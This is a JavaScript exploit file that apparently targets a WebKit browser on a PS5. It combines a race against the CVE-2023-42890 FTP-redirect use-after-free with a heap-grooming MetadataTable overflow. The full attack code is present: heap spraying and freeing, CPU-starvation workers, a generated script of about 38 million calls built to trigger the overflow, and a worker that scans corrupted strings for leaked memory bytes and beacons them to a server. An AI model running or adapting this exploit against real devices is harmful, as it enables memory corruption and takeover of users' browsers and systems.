// p171 — Dual exploit: heap race + MetadataTable overflow with mapped padding
//
// Track A: CVE-2023-42890 FTP UAF with concurrent heap flooding
//   - Spawn workers doing rapid alloc/free to create allocation pressure
//   - Trigger FTP redirect while workers are churning the NetworkProcess heap
//   - Even "benign" UAF may crash if freed memory gets reallocated mid-return
//
// Track B: MetadataTable overflow with MASSIVE pre-mapped heap
//   - Allocate 500MB+ of ArrayBuffers to ensure marge pages are mapped
//   - Free them (MADV_FREE keeps pages mapped on FreeBSD)
//   - Sweep has more runway before hitting unmapped pages
//   - Multiple CPU-starvation workers slow down LLInt execution
//   - Gives watcher more time to observe corruption
//
// Beacon prefix: V171-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var queue = [];
  var sending = false;

  function B(tag) {
    queue.push(tag);
    if (!sending) drain();
  }

  function drain() {
    if (queue.length === 0) { sending = false; return; }
    sending = true;
    var tag = queue.shift();
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V171-' + tag + '?t=' + Date.now(), true);
      x.onloadend = function() { setTimeout(drain, 15); };
      x.onerror = function() { setTimeout(drain, 15); };
      x.send();
    } catch(e) { setTimeout(drain, 15); }
  }

  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  var attempt = 0;
  try {
    attempt = parseInt(localStorage.getItem('p171_att') || '0');
    localStorage.setItem('p171_att', '' + (attempt + 1));
  } catch(e) {}

  B('BOOT-A' + attempt);

  // ═══════════════════════════════════════════════════════
  // TRACK A: CVE-2023-42890 with heap flooding
  // ═══════════════════════════════════════════════════════

  function trackA() {
    B('A-START');

    // Fire 200 rapid fetches to create allocation churn in NetworkProcess
    // Each fetch creates/destroys objects in the NetworkProcess heap
    var floodCount = 0;

    function floodBurst() {
      for (var i = 0; i < 50; i++) {
        // These create NetworkLoad objects, response headers get allocated
        fetch(BASE + '/beacon/V171-F' + floodCount + '?t=' + Date.now() + '&pad=' + 'X'.repeat(500))
          .catch(function(){});
        floodCount++;
      }
    }

    // Burst 1: fill the heap
    floodBurst();

    // 100ms later: trigger UAF while heap is hot
    setTimeout(function() {
      floodBurst(); // burst 2: concurrent with trigger

      // Trigger FTP redirect UAF
      fetch(BASE + '/ftp-redir', { redirect: 'follow' }).catch(function(e) {
        B('A-UAF1-' + (e.message || '').substring(0, 20));
      });

      // More bursts to race the freed slot
      setTimeout(function() { floodBurst(); }, 10);
      setTimeout(function() { floodBurst(); }, 20);
      setTimeout(function() { floodBurst(); }, 30);

      // Fire 10 FTP redirects rapidly
      for (var j = 0; j < 10; j++) {
        fetch(BASE + '/ftp-redir?race=' + j, { redirect: 'follow' }).catch(function(){});
      }
    }, 100);

    // Check if NetworkProcess crashed after 2 seconds
    setTimeout(function() {
      fetch(BASE + '/beacon/V171-A-ALIVE?t=' + Date.now())
        .then(function() {
          B('A-SURVIVED');
          // NetworkProcess survived — UAF is benign on this path
          // Start Track B
          trackB();
        })
        .catch(function() {
          B('A-NETDEAD');
          // NetworkProcess crashed! We have a crash primitive!
        });
    }, 2000);
  }

  // ═══════════════════════════════════════════════════════
  // TRACK B: MetadataTable overflow with mapped heap padding
  // ═══════════════════════════════════════════════════════

  function trackB() {
    B('B-START');

    // Phase 1: Map as much heap as possible
    // Allocate 500MB in 100KB chunks (5000 buffers)
    // These go to marge bitfit (same allocator as MetadataTable)
    var CHUNK_SIZE = 102400; // 100KB — same size class as metadata buffer
    var N_CHUNKS = 1000;     // 100MB total (500MB OOM'd the PS5)
    var padding = [];
    var allocated = 0;

    function allocChunk() {
      try {
        for (var i = 0; i < 100 && allocated < N_CHUNKS; i++) {
          padding.push(new ArrayBuffer(CHUNK_SIZE));
          allocated++;
        }
      } catch(e) {
        B('B-OOM-' + allocated);
        // Hit memory limit, continue with what we have
        allocated = N_CHUNKS; // stop trying
      }

      if (allocated < N_CHUNKS) {
        if (allocated % 200 === 0) B('B-ALLOC-' + allocated);
        setTimeout(allocChunk, 5);
      } else {
        B('B-MAPPED-' + padding.length);
        phase2Free();
      }
    }

    // Phase 2: Free padding (pages stay mapped via MADV_FREE)
    function phase2Free() {
      var count = padding.length;
      for (var i = 0; i < padding.length; i++) padding[i] = null;
      padding = null;

      // GC pressure to free wrappers but keep mapped pages
      B('B-FREE-' + count);
      var gc = 0;
      function gcPush() {
        for (var j = 0; j < 2000; j++) new ArrayBuffer(8192);
        gc++;
        if (gc < 50) setTimeout(gcPush, 20);
        else { B('B-GC-OK'); phase3Targets(); }
      }
      gcPush();
    }

    // Phase 3: Allocate targets + baits
    function phase3Targets() {
      B('B-TARGETS');

      // Create watcher worker
      var watcherCode = function() {
        var targets = [];
        var baseUrl = '';
        var STR_LEN = 100000;

        function beacon(tag) {
          try {
            var x = new XMLHttpRequest();
            x.open('GET', baseUrl + '/beacon/V171-W-' + tag + '?t=' + Date.now(), true);
            x.send();
          } catch(e) {}
        }
        function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

        self.onmessage = function(e) {
          if (e.data.cmd === 'init') {
            baseUrl = e.data.baseUrl;
            beacon('ALIVE');
            return;
          }
          if (e.data.cmd === 'alloc') {
            var chunk = '';
            for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
            for (var i = 0; i < 14; i++) {
              var s = '';
              for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
              s = s.substring(0, STR_LEN);
              s.charCodeAt(0);
              targets.push(s);
            }
            beacon('T-' + targets.length);
            self.postMessage({ ready: true });
            return;
          }
          if (e.data.cmd === 'watch') {
            beacon('WATCH');
            var found = -1;
            var iters = 0;

            while (found < 0) {
              for (var i = 0; i < targets.length; i++) {
                if (targets[i].length !== STR_LEN) {
                  found = i;
                  break;
                }
              }
              iters++;
              if (iters % 5000000 === 0) beacon('P-' + iters);
              if (iters > 500000000) { beacon('GIVEUP'); return; }
            }

            beacon('HIT-' + found + '-len=' + targets[found].length);

            var lens = '';
            for (var i = 0; i < targets.length; i++) lens += targets[i].length + ',';
            beacon('LENS-' + lens);

            for (var i = 0; i < targets.length; i++) {
              var len = targets[i].length;
              if (len === STR_LEN) continue;

              beacon('C' + i + '-0x' + len.toString(16));

              // charCodeAt scan
              var cc = '';
              var scanMax = Math.min(len, 300);
              for (var b = 0; b < scanMax; b++) {
                try {
                  var ch = targets[i].charCodeAt(b);
                  if (ch !== 0x41) cc += b + ':' + hx(ch) + ',';
                } catch(e) { cc += b + ':E,'; break; }
              }
              beacon('CC' + i + '-' + (cc || 'ALL41').substring(0, 200));

              // codePointAt
              try {
                var cp = '';
                for (var b = 0; b < 16; b++) cp += targets[i].codePointAt(b) + ',';
                beacon('CP' + i + '-' + cp);
              } catch(e) { beacon('CP' + i + '-E'); }

              // TextEncoder
              try {
                var enc = new TextEncoder();
                var bytes = enc.encode(targets[i].substring(0, 64));
                var te = '';
                for (var b = 0; b < bytes.length; b++) te += hx(bytes[b]);
                beacon('TE' + i + '-' + te.substring(0, 200));
              } catch(e) { beacon('TE' + i + '-E'); }

              // btoa
              try {
                var b64 = btoa(targets[i].substring(0, 48));
                beacon('B6' + i + '-' + b64.substring(0, 100));
              } catch(e) { beacon('B6' + i + '-E-' + (e.message||'').substring(0,20)); }

              // struct offsets — key addresses in metadata entry
              if (len > 112) {
                var st = '';
                var off = [0,4,8,12,16,20,24,28,32,48,56,64,68,72,80,96,104,108,112];
                for (var oi = 0; oi < off.length; oi++) {
                  try { st += off[oi] + ':' + hx(targets[i].charCodeAt(off[oi])) + ','; }
                  catch(e) { st += off[oi] + ':E,'; }
                }
                beacon('ST' + i + '-' + st.substring(0, 200));
              }

              // rawlen breakdown
              var b0 = len & 0xFF, b1 = (len>>8) & 0xFF;
              var b2 = (len>>16) & 0xFF, b3 = (len>>24) & 0xFF;
              beacon('RL' + i + '-' + hx(b3) + hx(b2) + hx(b1) + hx(b0));

              if (i >= 3) break;
            }
            beacon('DONE');
          }
        };
      };

      var watchBlob = new Blob(
        ['(' + watcherCode.toString() + ')()'],
        { type: 'application/javascript' }
      );
      var watcher = new Worker(URL.createObjectURL(watchBlob));
      watcher.postMessage({ cmd: 'init', baseUrl: BASE });

      // Spawn CPU starvation workers to slow down LLInt
      var STARVATION_WORKERS = 4;
      var starvCode = function() {
        self.onmessage = function(e) {
          if (e.data.cmd === 'spin') {
            // Tight loop — consumes CPU, slows main thread LLInt execution
            var x = 0;
            while (true) {
              x = (x + 1) | 0;
              if ((x & 0xFFFFFFF) === 0) {
                // Occasionally yield to avoid being killed
                // but mostly burn CPU
              }
            }
          }
        };
      };

      var starvBlob = new Blob(
        ['(' + starvCode.toString() + ')()'],
        { type: 'application/javascript' }
      );
      for (var sw = 0; sw < STARVATION_WORKERS; sw++) {
        var starver = new Worker(URL.createObjectURL(starvBlob));
        starver.postMessage({ cmd: 'spin' });
      }
      B('B-STARV-' + STARVATION_WORKERS);

      // Baits — vary by attempt
      var N_BAIT = 20 + (attempt % 5) * 2;
      var STR_LEN = 100000;
      B('B-BAIT-N' + N_BAIT);
      var baits = [];
      var baitChunk = '';
      for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
      for (var i = 0; i < N_BAIT; i++) {
        var bait = '';
        for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
        bait = bait.substring(0, STR_LEN);
        bait.charCodeAt(0);
        baits.push(bait);
      }
      baitChunk = null;
      B('B-BAIT-OK');

      // Worker targets
      watcher.onmessage = function(e) {
        if (e.data.ready) doFreeAndBuild();
      };
      watcher.postMessage({ cmd: 'alloc' });

      function doFreeAndBuild() {
        // Free baits
        for (var i = 0; i < baits.length; i++) baits[i] = null;
        baits = null;
        B('B-FREE-BAITS');

        // GC
        var gc = 0;
        function gcRound() {
          for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
          gc++;
          if (gc < 30) setTimeout(gcRound, 30);
          else { B('B-GC2-OK'); doBuild(); }
        }
        gcRound();
      }

      function doBuild() {
        B('B-BUILD');
        var N = 38348816;
        var CHUNK = 4000000;
        var CHUNKS = Math.floor(N / CHUNK);
        var REM = N - CHUNKS * CHUNK;

        var callChunk = '';
        for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
        var remChunk = '';
        for (var r = 0; r < REM; r++) remChunk += 'a();';

        var parts = ['window.__v171=function(a){'];
        for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
        parts.push(remChunk);
        parts.push('};window.__v171ok=1;');

        var blob = new Blob(parts, { type: 'application/javascript' });
        B('B-BLOB-' + (blob.size / 1048576 | 0) + 'M');
        callChunk = null; remChunk = null; parts = null;

        var url = URL.createObjectURL(blob);
        var sc = document.createElement('script');

        sc.onload = function() {
          B('B-COMP-' + (window.__v171ok ? 'OK' : 'NO'));
          if (!window.__v171) { B('B-NOFN'); return; }

          // Start watching BEFORE calling
          watcher.postMessage({ cmd: 'watch' });

          setTimeout(function() {
            B('B-CALL');
            try {
              window.__v171(function(){});
            } catch(ex) {
              B('B-EX-' + (ex.message || '').substring(0, 20));
            }
            B('B-ALIVE');
          }, 200);
        };

        sc.onerror = function() { B('B-SERR'); };
        document.head.appendChild(sc);
        sc.src = url;
      }
    }
  }

  // Start Track A first (quick), then Track B
  trackA();
})();
